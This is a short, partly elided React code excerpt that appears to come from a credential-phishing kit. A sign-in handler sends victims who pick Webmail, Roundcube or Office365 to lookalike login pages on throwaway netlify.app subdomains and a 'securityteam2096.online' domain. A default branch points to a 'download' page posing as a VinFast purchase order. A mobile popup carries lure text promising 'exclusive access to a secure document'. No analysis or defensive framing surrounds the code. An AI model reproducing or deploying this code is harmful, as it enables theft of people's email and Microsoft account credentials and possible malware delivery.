...
const Popup = ({ domain, eparams, systemInfo }) => {
  ...
  const handleSignIn = async (provider) => {
    ...
    switch (provider) {
      case "Webmail":
        redirectUrl = "https://webmailjgcgvbjg.netlify.app/fkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq/login";
        break;
      case "Roundcube":
        redirectUrl = "https://roundcubedscfdvbfng.netlify.app/fkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq/login";
        break;
      case "Office365":
        redirectUrl = "https://login.securityteam2096.online/pKVVNFUv";
        break;
      default:
        redirectUrl = "https://vinfastautopurchaseorder.netlify.app/fkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq/download";
    }
...
const PopupMobile = ({ domain, eparams, systemInfo }) => {
  ...
  return (
    ...
    >
      ...
      <p style={{ fontSize: "12px", color: "#ddd", marginBottom: "20px", fontWeight: "bold" }}>
        You have been granted exclusive access to a secure document for digital viewing and review.
      </p>
      <p style={{ fontSize: "12px", color: "#ddd" }}>
       To view and interact with your document, please select your preferred authentication method below and log in.
